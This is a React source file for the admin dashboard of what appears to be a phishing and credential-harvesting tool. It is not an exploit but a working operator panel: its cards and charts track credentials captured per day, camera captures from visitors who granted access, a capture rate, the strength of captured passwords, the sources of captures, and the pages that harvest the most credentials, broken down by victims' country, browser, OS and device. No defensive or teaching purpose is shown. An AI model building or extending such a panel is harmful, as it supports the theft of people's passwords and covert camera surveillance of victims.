import React, { useState, useEffect } from 'react';
import { Grid, Card, CardContent, Typography, Box, Chip, CircularProgress, Avatar, Divider } from '@mui/material';
import { LineChart, Line, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, PieChart, Pie, Cell, AreaChart, Area } from 'recharts';
import axios from 'axios';
import PeopleIcon from '@mui/icons-material/People';
import LockIcon from '@mui/icons-material/Lock';
import CameraAltIcon from '@mui/icons-material/CameraAlt';
import OnlinePredictionIcon from '@mui/icons-material/OnlinePrediction';
import DevicesIcon from '@mui/icons-material/Devices';
import StorageIcon from '@mui/icons-material/Storage';
import TrendingUpIcon from '@mui/icons-material/TrendingUp';
import WarningIcon from '@mui/icons-material/Warning';
import SecurityIcon from '@mui/icons-material/Security';

const COLORS = ['#00f0ff', '#ff0055', '#ffaa00', '#00ff88', '#8884d8', '#ff6b6b', '#667eea'];

const StatCard = ({ title, value, icon, color, subtitle, trend }) => (
  <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)', height: '100%', position: 'relative', overflow: 'visible' }}>
    <CardContent sx={{ p: 2.5 }}>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
        <Box>
          <Typography sx={{ color: '#888', fontSize: '0.8rem', mb: 0.5, letterSpacing: '0.02em' }}>{title}</Typography>
          <Typography variant="h3" sx={{ color: '#fff', fontWeight: 700, fontSize: '2rem', lineHeight: 1.2 }}>{value}</Typography>
          {subtitle && (
            <Typography sx={{ color, fontSize: '0.78rem', mt: 0.5, fontWeight: 500 }}>
              {subtitle}
            </Typography>
          )}
          {trend !== undefined && (
            <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5, mt: 0.5 }}>
              <TrendingUpIcon sx={{ color: trend >= 0 ? '#00ff88' : '#ff0055', fontSize: 14 }} />
              <Typography sx={{ color: trend >= 0 ? '#00ff88' : '#ff0055', fontSize: '0.75rem', fontWeight: 600 }}>
                {trend >= 0 ? '+' : ''}{trend}%
              </Typography>
            </Box>
          )}
        </Box>
        <Box sx={{ bgcolor: `${color}15`, borderRadius: 2, p: 1.5, display: 'flex', border: `1px solid ${color}30` }}>
          {icon}
        </Box>
      </Box>
    </CardContent>
  </Card>
);

const SectionHeader = ({ title, subtitle }) => (
  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, mb: 2.5, mt: 1 }}>
    <Box sx={{ width: 4, height: 22, bgcolor: '#00f0ff', borderRadius: 2 }} />
    <Box>
      <Typography variant="h6" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.05rem' }}>{title}</Typography>
      {subtitle && <Typography sx={{ color: '#666', fontSize: '0.75rem' }}>{subtitle}</Typography>}
    </Box>
  </Box>
);

export default function Dashboard() {
  const [stats, setStats] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchStats = async () => {
      try {
        const res = await axios.get('/api/admin/stats');
        setStats(res.data);
      } catch(e) { console.error(e); }
      finally { setLoading(false); }
    };
    fetchStats();
    const interval = setInterval(fetchStats, 15000);
    return () => clearInterval(interval);
  }, []);

  if (loading) return (
    <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', pt: 12, gap: 2 }}>
      <CircularProgress sx={{ color: '#00f0ff' }} />
      <Typography sx={{ color: '#888', fontSize: '0.85rem' }}>Loading dashboard data...</Typography>
    </Box>
  );
  if (!stats) return (
    <Box sx={{ textAlign: 'center', pt: 8 }}>
      <WarningIcon sx={{ color: '#ffaa00', fontSize: 48, mb: 2 }} />
      <Typography sx={{ color: '#ff0055' }}>Failed to load dashboard stats. Check server connection.</Typography>
    </Box>
  );

  const credentialChartData = stats.credentialsOverTime?.map(d => ({ date: d._id, count: d.count })) || [];
  const geoData = stats.geoDistribution?.map(d => ({ name: d._id || 'Unknown', count: d.count })) || [];
  const strengthData = stats.strengthDist?.map(d => ({ name: d._id, value: d.count })) || [];
  const osData = stats.osDist?.slice(0, 6).map(d => ({ name: d._id || 'Unknown', count: d.count })) || [];
  const deviceData = stats.deviceDist?.map(d => ({ name: d._id || 'Unknown', count: d.count })) || [];

  return (
    <Box>
      {/* Page Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
        <Box>
          <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.5rem' }}>
            📊 Dashboard Overview
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.3 }}>
            Real-time intelligence summary · Auto-refreshes every 15s
          </Typography>
        </Box>
        <Box sx={{ display: 'flex', gap: 1 }}>
          <Chip icon={<SecurityIcon sx={{ color: '#00f0ff', fontSize: 16 }} />} label={`Capture Rate: ${stats.captureRate}%`} variant="outlined" sx={{ color: '#00f0ff', borderColor: 'rgba(0,240,255,0.3)' }} />
          <Chip icon={<CameraAltIcon sx={{ color: '#ffaa00', fontSize: 16 }} />} label={`Camera Rate: ${stats.cameraRate}%`} variant="outlined" sx={{ color: '#ffaa00', borderColor: 'rgba(255,170,0,0.3)' }} />
        </Box>
      </Box>

      {/* Stats Cards */}
      <Grid container spacing={2.5} sx={{ mb: 4 }}>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard title="Total Sessions" value={stats.totalSessions.toLocaleString()} icon={<PeopleIcon sx={{ color: '#00f0ff', fontSize: 28 }} />} color="#00f0ff" subtitle={`${stats.sessionsToday} today`} />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard title="Online Now" value={stats.onlineNow} icon={<OnlinePredictionIcon sx={{ color: '#00ff88', fontSize: 28 }} />} color="#00ff88" subtitle="Last 5 minutes" />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard title="Credentials Captured" value={stats.totalCredentials.toLocaleString()} icon={<LockIcon sx={{ color: '#ff0055', fontSize: 28 }} />} color="#ff0055" subtitle={`${stats.credentialsToday} captured today`} />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard title="Camera Captures" value={stats.totalCameraCaptures.toLocaleString()} icon={<CameraAltIcon sx={{ color: '#ffaa00', fontSize: 28 }} />} color="#ffaa00" subtitle={`${stats.camerasGranted} granted access`} />
        </Grid>
      </Grid>

      {/* Charts Row 1 */}
      <Grid container spacing={2.5} sx={{ mb: 2.5 }}>
        {/* Credentials Over Time */}
        <Grid item xs={12} md={8}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)', height: '100%' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Credentials Captured (Last 7 Days)" subtitle="Daily credential capture trend" />
              <ResponsiveContainer width="100%" height={300}>
                <AreaChart data={credentialChartData}>
                  <defs>
                    <linearGradient id="colorCount" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#00f0ff" stopOpacity={0.3} />
                      <stop offset="95%" stopColor="#00f0ff" stopOpacity={0} />
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.04)" />
                  <XAxis dataKey="date" stroke="#555" tick={{ fontSize: 12 }} />
                  <YAxis stroke="#555" tick={{ fontSize: 12 }} />
                  <Tooltip contentStyle={{ bgcolor: '#1a1a2e', border: '1px solid #333', color: '#fff', borderRadius: 8 }} />
                  <Area type="monotone" dataKey="count" stroke="#00f0ff" strokeWidth={2} fill="url(#colorCount)" dot={{ fill: '#00f0ff', r: 3 }} />
                </AreaChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>
        </Grid>

        {/* Geographic Distribution */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)', height: '100%' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Top Countries" subtitle="Geographic distribution" />
              <ResponsiveContainer width="100%" height={300}>
                <PieChart>
                  <Pie data={geoData.slice(0, 6)} cx="50%" cy="50%" outerRadius={90} dataKey="count" label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`} labelLine={false}>
                    {geoData.slice(0, 6).map((_, i) => <Cell key={i} fill={COLORS[i % COLORS.length]} />)}
                  </Pie>
                  <Tooltip contentStyle={{ bgcolor: '#1a1a2e', border: '1px solid #333', color: '#fff', borderRadius: 8 }} />
                </PieChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>
        </Grid>
      </Grid>

      {/* Charts Row 2 */}
      <Grid container spacing={2.5} sx={{ mb: 2.5 }}>
        {/* Password Strength */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Password Strength" subtitle="Security analysis" />
              {strengthData.length > 0 ? (
                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1.5 }}>
                  {strengthData.map((item, i) => {
                    const totalCount = strengthData.reduce((sum, d) => sum + d.value, 0);
                    const percent = totalCount > 0 ? ((item.value / totalCount) * 100).toFixed(1) : 0;
                    const colorMap = { weak: '#ff0055', medium: '#ffaa00', strong: '#00f0ff', 'very-strong': '#00ff88' };
                    const itemColor = colorMap[item.name] || '#888';
                    return (
                      <Box key={item.name}>
                        <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 0.3 }}>
                          <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>{item.name}</Typography>
                          <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.85rem' }}>{item.value} ({percent}%)</Typography>
                        </Box>
                        <Box sx={{ width: '100%', height: 6, bgcolor: 'rgba(255,255,255,0.04)', borderRadius: 3 }}>
                          <Box sx={{ width: `${percent}%`, height: '100%', bgcolor: itemColor, borderRadius: 3, transition: 'width 0.5s' }} />
                        </Box>
                      </Box>
                    );
                  })}
                </Box>
              ) : (
                <Typography sx={{ color: '#666', textAlign: 'center', py: 4 }}>No credentials captured yet</Typography>
              )}
            </CardContent>
          </Card>
        </Grid>

        {/* Browser Distribution */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Browser Distribution" subtitle="Top browsers used" />
              <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1.5 }}>
                {stats.browserDist?.slice(0, 6).map((b, i) => (
                  <Box key={b._id}>
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 0.3 }}>
                      <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>{b._id || 'Unknown'}</Typography>
                      <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.85rem' }}>{b.count}</Typography>
                    </Box>
                    <Box sx={{ width: '100%', height: 5, bgcolor: 'rgba(255,255,255,0.04)', borderRadius: 3 }}>
                      <Box sx={{ width: `${(b.count / (stats.totalSessions || 1)) * 100}%`, height: '100%', bgcolor: COLORS[i % COLORS.length], borderRadius: 3 }} />
                    </Box>
                  </Box>
                ))}
                {(!stats.browserDist || stats.browserDist.length === 0) && (
                  <Typography sx={{ color: '#666', textAlign: 'center', py: 4 }}>No data available</Typography>
                )}
              </Box>
            </CardContent>
          </Card>
        </Grid>

        {/* OS Distribution */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Operating Systems" subtitle="Platform breakdown" />
              <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1.5 }}>
                {osData.map((os, i) => (
                  <Box key={os.name}>
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 0.3 }}>
                      <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>{os.name}</Typography>
                      <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.85rem' }}>{os.count}</Typography>
                    </Box>
                    <Box sx={{ width: '100%', height: 5, bgcolor: 'rgba(255,255,255,0.04)', borderRadius: 3 }}>
                      <Box sx={{ width: `${(os.count / (stats.totalSessions || 1)) * 100}%`, height: '100%', bgcolor: COLORS[(i + 2) % COLORS.length], borderRadius: 3 }} />
                    </Box>
                  </Box>
                ))}
                {osData.length === 0 && (
                  <Typography sx={{ color: '#666', textAlign: 'center', py: 4 }}>No data available</Typography>
                )}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      </Grid>

      {/* Charts Row 3 */}
      <Grid container spacing={2.5}>
        {/* Credential Sources */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Capture Sources" subtitle="Method of capture" />
              {stats.topSources?.map((s, i) => (
                <Box key={s._id} sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.5, '&:last-child': { mb: 0 } }}>
                  <Chip label={s._id} size="small" sx={{ bgcolor: `${COLORS[i % COLORS.length]}15`, color: COLORS[i % COLORS.length], fontWeight: 600, fontSize: '0.75rem' }} />
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <Box sx={{ width: 60, height: 4, bgcolor: 'rgba(255,255,255,0.04)', borderRadius: 2 }}>
                      <Box sx={{ width: `${(s.count / (stats.totalCredentials || 1)) * 100}%`, height: '100%', bgcolor: COLORS[i % COLORS.length], borderRadius: 2 }} />
                    </Box>
                    <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.85rem' }}>{s.count}</Typography>
                  </Box>
                </Box>
              ))}
              {(!stats.topSources || stats.topSources.length === 0) && (
                <Typography sx={{ color: '#666', textAlign: 'center', py: 4 }}>No sources recorded</Typography>
              )}
            </CardContent>
          </Card>
        </Grid>

        {/* Device Type Distribution */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Device Types" subtitle="Form factor analysis" />
              <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1.5 }}>
                {deviceData.map((d, i) => (
                  <Box key={d.name}>
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 0.3 }}>
                      <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>{d.name}</Typography>
                      <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.85rem' }}>{d.count}</Typography>
                    </Box>
                    <Box sx={{ width: '100%', height: 5, bgcolor: 'rgba(255,255,255,0.04)', borderRadius: 3 }}>
                      <Box sx={{ width: `${(d.count / (stats.totalSessions || 1)) * 100}%`, height: '100%', bgcolor: COLORS[(i + 3) % COLORS.length], borderRadius: 3 }} />
                    </Box>
                  </Box>
                ))}
                {deviceData.length === 0 && (
                  <Typography sx={{ color: '#666', textAlign: 'center', py: 4 }}>No data available</Typography>
                )}
              </Box>
            </CardContent>
          </Card>
        </Grid>

        {/* Top URLs */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)' }}>
            <CardContent sx={{ p: 2.5 }}>
              <SectionHeader title="Top URLs for Credentials" subtitle="Most harvested pages" />
              {stats.topUrls?.slice(0, 8).map((u, i) => (
                <Box key={u._id} sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.2, '&:last-child': { mb: 0 } }}>
                  <Typography sx={{ color: '#aaa', fontSize: '0.8rem', maxWidth: '65%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {u._id}
                  </Typography>
                  <Chip label={u.count} size="small" sx={{ bgcolor: 'rgba(255,0,85,0.12)', color: '#ff0055', fontWeight: 700, fontSize: '0.75rem' }} />
                </Box>
              ))}
              {(!stats.topUrls || stats.topUrls.length === 0) && (
                <Typography sx={{ color: '#666', textAlign: 'center', py: 4 }}>No URLs recorded yet</Typography>
              )}
            </CardContent>
          </Card>
        </Grid>
      </Grid>
    </Box>
  );
}